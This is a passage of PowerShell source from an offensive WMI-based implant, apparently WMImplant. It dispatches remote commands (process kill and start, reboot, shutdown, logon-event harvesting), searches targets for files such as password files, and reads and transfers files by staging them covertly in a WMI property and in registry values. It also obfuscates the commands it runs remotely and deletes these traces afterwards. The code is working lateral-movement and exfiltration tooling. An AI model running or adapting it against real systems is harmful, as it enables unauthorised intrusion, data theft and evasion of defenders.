
            "process_kill"
            {
                if ($Credential)
                {
                    Invoke-ProcessPunisher -Creds $Credential
                }

                else
                {
                    Invoke-ProcessPunisher
                }
            }

            "process_start"
            {
                if ($Credential)
                {
                    Invoke-ProcSpawn -Creds $Credential
                }

                else
                {
                    Invoke-ProcSpawn
                }
            }

            "ps"
            {
                if ($Credential)
                {
                    Get-ProcessListingWMImplant -Creds $Credential
                }

                else
                {
                    Get-ProcessListingWMImplant
                }
            }

            "active_users"
            {
                if($Credential)
                {
                    Find-CurrentUsers -Creds $Credential
                }

                else
                {
                    Find-CurrentUsers
                }
            }

            "basic_info"
            {
                if($Credential)
                {
                    Get-HostInfo -Creds $Credential
                }

                else
                {
                    Get-HostInfo
                }
            }

            "drive_list"
            {
                if($Credential)
                {
                    Get-ComputerDrives -Creds $Credential
                }

                else
                {
                    Get-ComputerDrives
                }
            }

            "ifconfig"
            {
                if($Credential)
                {
                    Get-NetworkCards -Creds $Credential
                }

                else
                {
                    Get-NetworkCards
                }
            }

            "installed_programs"
            {
                if($Credential)
                {
                    Get-InstalledPrograms -Creds $Credential
                }

                else
                {
                    Get-InstalledPrograms
                }
            }

            "logon_events"
            {
                $FileSave = Read-Host "Do you want to save the log information to a file? [yes/no] >"
                $FileSave = $FileSave.Trim().ToLower()

                if(($FileSave -eq "y") -or ($FileSave -eq "yes"))
                {
                    $FileSavePath = Read-Host "What is the full path to where the file should be saved? >"
                    $FileSavePath = $FileSavePath.Trim()

                    if($Credential)
                    {
                        Get-WMIEventLogins -Creds $Credential -FileName $FileSavePath
                    }

                    else
                    {
                        Get-WMIEventLogins -FileName $FileSavePath
                    }
                }

                else
                {
                    if($Credential)
                    {
                        Get-WMIEventLogins -Creds $Credential
                    }

                    else
                    {
                        Get-WMIEventLogins
                    }
                }
            }

            "logoff"
            {
                if($Credential)
                {
                    Invoke-PowerOptionsWMI -Creds $Credential -Logoff
                }

                else
                {
                    Invoke-PowerOptionsWMI -Logoff
                }
            }

            "reboot"
            {
                if($Credential)
                {
                    Invoke-PowerOptionsWMI -Creds $Credential -Reboot
                }

                else
                {
                    Invoke-PowerOptionsWMI -Reboot
                }
            }

            "power_off"
            {
                if($Credential)
                {
                    Invoke-PowerOptionsWMI -Creds $Credential -Shutdown
                }

                else
                {
                    Invoke-PowerOptionsWMI -Shutdown
                }
            }

            "vacant_system"
            {
                if($Credential)
                {
                    Find-VacantComputer -Creds $Credential
                }
                else
                {
                    Find-VacantComputer
                }
            }

            default
            {
                Write-Output "You did not select a valid command! Please try again!"
            }
        } #End of switch
    } # End of while loop
} # End of function

function Find-FileWMImplant
{
    # This function enables a user to search for a file name or extension on the
    # targeted computer
    param
    (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target,
        [Parameter(Mandatory = $False)]
        [string]$File,
        [Parameter(Mandatory = $False)]
        [string]$Drive,
        [Parameter(Mandatory = $False, ParameterSetName='extension')] 
        [string]$Extension
    )

    process
    {
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        if(!$Drive)
        {
            $Drive = Read-Host "What drive do you want to search? (Ex: C:) >"
            $Drive = $Drive.Trim()
        }

        # Check length of drive, only want first two characters
        if($Drive.length -gt 2)
        {
            $Drive = $Drive.substring(0,2)
        }

        elseif($Drive.length -lt 2)
        {
            Throw "Drive needs two character EX: C:"
        }

        if(!$File -and !$Extension)
        {
            $Search_Target = Read-Host "Do you want to search for a [file] or file [extension]? >"
            $Search_Target = $Search_Target.Trim().ToLower()

            if($Search_Target -eq "file")
            {
                $File = Read-Host "What file do you want to search for? (Ex: pass.txt or *ssword.txt) >"
                $File = $File.Trim().ToLower()
            }
            elseif($Search_Target -eq "extension")
            {
                $Extension = Read-Host "What file extension do you want to search for? (Ex: sql) >"
                $Extension = $Extension.Trim().ToLower()
            }
            else
            {
                Throw "You need to search for either a file or file extension!"
            }
        }

        # If searching for a file and not a file extension
        if($File)
        {
            $counter = 0
            $filter = "Filename"
            foreach($incoming_file in $File)
            {
                if($counter -gt 0)
                {
                    $filter += "OR Filename"
                }

                if($incoming_file.Contains("."))
                {
                    #get the index of the last .
                    $index = $incoming_file.LastIndexOf(".")
                    #get the first part of the name
                    $filename = $incoming_file.Substring(0,$index)
                    #get the last part of the name
                    $extension = $incoming_file.Substring($index+1)

                    if($filename -match "\*")
                    {
                        $filename = $filename.Replace("*","%")
                        $filter += " LIKE '$filename' "
                    }
                    else
                    {
                        $filter += " = '$filename' "
                    }

                    if ($extension -match "\*")
                    {
                        $extension = $extension.Replace("*","%")
                        $filter += "AND Extension LIKE '$extension' "
                    }
                    else 
                    {
                        $filter += "AND Extension = '$extension' "
                    }
                    
                }
                else
                {
                    if($incoming_file -match "\*")
                    {
                        $filename = $incoming_file.Replace("*","%")
                        $filter += " LIKE '$filename' "
                    }
                    else
                    {
                        $filter += " = '$incoming_file' "
                    }
                }
                $counter += 1
            }
        }

        # If searching by extension
        elseif($Extension)
        {
            $counter = 0
            $filter = "Extension"
            foreach($ext in $Extension)
            {
                if($counter -gt 0)
                {
                    $filter += "OR Extension"
                }

                if ($ext -match "\*")
                {
                    $ext = $ext.Replace("*","%")
                    $filter += " LIKE '$ext' "
                }
                else 
                {
                    $filter += " = '$ext' "
                }
                $counter += 1
            }
        }

        $filter += "AND Drive='$Drive'"

        if($Creds)
        {
            Get-WmiObject -Class cim_datafile -filter $filter -ComputerName $Target -Credential $Creds
        }
        else
        {
            Get-WmiObject -Class cim_datafile -filter $filter -ComputerName $Target
        }
    }
}

function Get-FileContentsWMImplant
{
    # This function reads and displays the contents of a user-specified file on the targeted machine to the console
    param
    (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target,
        [Parameter(Mandatory = $False)]
        [string]$File
    )

    Process
    {

        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        if(!$File)
        {
            $File = Read-Host "What's the full path to the file you'd like to view? >"
            $File = $File.Trim()
        }

        # Keep original WMI Property Value
        if($Creds)
        {
            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target -Credential $Creds).DebugFilePath
        }
        else
        {
            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target).DebugFilePath
        }

        # On remote system, save file to registry
        Write-Verbose "Reading remote file and writing to WMI property"
        $remote_command = '$fct = Get-Content -Encoding byte -Path ''' + "$File" + '''; $fctenc = [Int[]][Char[]]$fct -Join '',''; $a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $fctenc; $a.Put()'

        if($Creds)
        {
            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -Creds $creds -ObfuscateWithEnvVar
        }
        else
        {
            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -ObfuscateWithEnvVar
        }

        # Poll remote system, and determine if the script is done
        # If not, sleep and poll again
        $quit = $false
        while($quit -eq $false)
        {
            Write-Verbose "Polling property to see if the script has completed"
            if($Creds)
            {
                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target -Credential $Creds
            }
            else
            {
                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target
            }
            
            try 
            {
                if($Original_WMIProperty -match  $modified_WMIObject.DebugFilePath)
                {
                    Write-Verbose "Script is not done, sleeping for 5 and trying again"
                    Start-Sleep -s 5
                }
                else 
                {
                    Write-Verbose "Script is complete, pulling data now"
                    $quit = $true
                }
            }
            catch
            {
                Write-Verbose "Script is not done, sleeping for 5 and trying again"
                Start-Sleep -s 5
            }
        }
    
        $decode = [char[]][int[]]$modified_WMIObject.DebugFilePath.Split(',') -Join ''
        # Print to console
        $decode

        # Removing Registry value from remote system
        Write-Verbose "Replacing property on remote system"

        $modified_WMIObject.DebugFilePath = $Original_WMIProperty
        $null = $modified_WMIObject.Put()

        Write-Verbose "Done!"
    }
    end{}
}

function Invoke-FileTransferWMImplant
{
    # This function enables the user to upload or download files to/from the attacking machine to/from the targeted machine
    param
    (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target,
        [Parameter(Mandatory = $False,ParameterSetName='download')]
        [switch]$Download,
        [Parameter(Mandatory = $False,ParameterSetName='upload')]
        [switch]$Upload,
        [Parameter(Mandatory = $False)]
        [string]$DownloadFile,
        [Parameter(Mandatory = $False)]
        [string]$DownloadFilePath,
        [Parameter(Mandatory = $False)]
        [string]$UploadFile,
        [Parameter(Mandatory = $False)]
        [string]$UploadFilePath
    )

    Process
    {
        # invoke powershell on both remote and local system.  Both will connect back over WMI to retrieve file contents
        # applies to both download and upload operations.
        # Uses HKLM/Software/Microsoft
        #2147483650 - hklm, 2147483649 - kkcu, 

        $fullregistrypath = "HKLM:\Software\Microsoft\Windows"
        $registryupname = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
        $registrydownname = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
        # The reghive value is for hkey_local_machine
        $reghive = 2147483650
        $regpath = "SOFTWARE\Microsoft\Windows"
        $SystemHostname = Get-WMIObject Win32_ComputerSystem | Select-Object -ExpandProperty name

        # Get information needed to transfer the file
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        if($Download)
        {
            if(!$DownloadFile)
            {
                $Download_File = Read-Host "What's the full path to the file you'd like to download? >"
                $Download_File = $Download_File.Trim()
            }
            else
            {
                $Download_File = $DownloadFile
            }

            if(!$DownloadFilePath)
            {
                $Download_File_Path = Read-Host "What's the full path to location you'd like to save the file locally? >"
                $Download_File_Path = $Download_File_Path.Trim()
            }
            else
            {
                $Download_File_Path = $DownloadFilePath
            }

            # On remote system, save file to registry
            Write-Verbose "Reading remote file and writing on remote registry"
            $remote_command = '$fct = Get-Content -Encoding byte -ReadCount 0 -Path ''' + "$Download_file" + '''; $fctenc = [Int[]][byte[]]$fct -Join '',''; New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $fctenc -PropertyType String -Force'

            if($Creds)
            {
                Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -Creds $Creds -ObfuscateWithEnvVar
            }
            else
            {
                Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -ObfuscateWithEnvVar
            }

            Write-Verbose "Sleeping to let remote system read and store file"
            Start-Sleep -s 30

            # Grab file from remote system's registry
            Write-Verbose "Reading file from remote registry"

            if($Creds)
            {
                $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $Target -Credential $Creds
            }
            else
            {
                $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $Target
            }
            
            $decode = [byte[]][int[]]$remote_reg.sValue.Split(',') -Join ' '
            [byte[]] $decoded = $decode -split ' '
            Set-Content -Encoding byte -Path $Download_file_path -Value $decoded

            # Removing Registry value from remote system
            Write-Verbose "Removing registry value from remote system"

            if($Creds)
            {
                $null = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $Target -Credential $Creds
            }
            else
            {
                $null = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $Target
            }

            Write-Verbose "Done!"
        }

        elseif($Upload)
        {
            if(!$UploadFile)
            {
                $Upload_File = Read-Host "What's the full path to the file you'd like to upload? >"
                $Upload_File = $Upload_File.Trim()
            }
            else
            {
                $Upload_File = $UploadFile
            }

            if(!$UploadFilePath)
            {
                $Upload_Dir = Read-Host "What is the full path to the location you would like the file uploaded to? >"
                $Upload_Dir = $Upload_Dir.Trim()
            }
            else
            {
                $Upload_Dir = $UploadFilePath
            }

            # Read in file and base64 encode it
            Write-Verbose "Read in local file and encode it"
            $filecontents = Get-Content -Encoding byte -ReadCount 0 $Upload_File
            $filecontentencoded = [Int[]][byte[]]$filecontents -Join ','

            Write-Verbose "Writing encoded file to remote registry"
            if($Creds)
            {
                $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'SetStringValue' -ArgumentList $reghive, $regpath, $filecontentencoded, $registryupname -ComputerName $Target -Credential $Creds
            }
            else
            {
                $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'SetStringValue' -ArgumentList $reghive, $regpath, $filecontentencoded, $registryupname -ComputerName $Target
            }
            
            # grabs registry value and saves to disk
            Write-Verbose "Connecting to $Target"
            $remote_command = '$Hive = 2147483650; $key = ''' + "$regpath'" + '; $value = ''' + "$registryupname" + '''; $out = Invoke-WmiMethod -Namespace ''root\default'' -Class ''StdRegProv'' -Name ''GetStringValue'' -ArgumentList $Hive, $key, $value; $decode = [byte[]][int[]]$out.sValue.Split('','') -Join '' ''; [byte[]] $decoded = $decode -split '' ''; Set-Content -Encoding byte -Path ' + "$Upload_Dir" + ' -Value $decoded'

            if($Creds)
            {
                Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -Creds $creds -ObfuscateWithEnvVar
            }
            else
            {
                Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -ObfuscateWithEnvVar
            }

            Write-Verbose "Sleeping to let remote system execute WMI command"
            Start-Sleep -s 30

            # Remove registry key
            Write-Verbose "Removing registry value storing uploaded file"
            if($Creds)
            {
                $null = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registryupname -ComputerName $Target -Credential $Creds
            }
            else
            {
                $null = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registryupname -ComputerName $Target
            }

            Write-Verbose "Done!"
        }
    } # End of Process Block
    end{}
} # End of Function block

function Invoke-LSWMImplant
{
    # This function retrieves a diretory listing of all files from a user-specified directory on the targeted system
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target,
        [Parameter(Mandatory = $False)] 
        [string]$Directory
    )

    Process
    {
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        if(!$Directory)
        {
            $Directory = Read-Host "What's the full path to the directory? >"
            $Directory = $Directory.Trim()
        }

        $Drive = $Directory.Substring(0,2)
        $DirPath = $Directory.Substring(2)
        $DirPath = $DirPath.Replace("\","\\")
        if(!$DirPath.Endswith('\\'))
        {
            $DirPath += "\\"
        }
        Write-Verbose "Connecting to $Target"
        $filter = "Drive='$Drive' and Path='$DirPath'"

        if($Creds)
        {
            Get-WmiObject -Class Win32_Directory -Filter $filter -ComputerName $Target -Credential $Creds
            Get-WMIObject -Class CIM_Datafile -filter $filter -ComputerName $Target -Credential $Creds
        }
        else
        {
            Get-WmiObject -Class Win32_Directory -Filter $filter -ComputerName $Target
            Get-WMIObject -Class CIM_Datafile -filter $filter -ComputerName $Target
        }
    }
    end{}
}

function Set-OriginalProperty
{
    # This function sets the DebugFilePath property to its default value
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target
    )

    Process
    {
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        $default_prop_value = "%SystemRoot%\Memory.dmp"
        # Set original WMI Property Value
        if($Creds)
        {
            $Original_WMIProperty = Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target -Credential $Creds
        }
        else
        {
            $Original_WMIProperty = Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target
        }
        $Original_WMIProperty.DebugFilePath = $default_prop_value
        $Original_WMIProperty.Put()
    }
    end{}
}
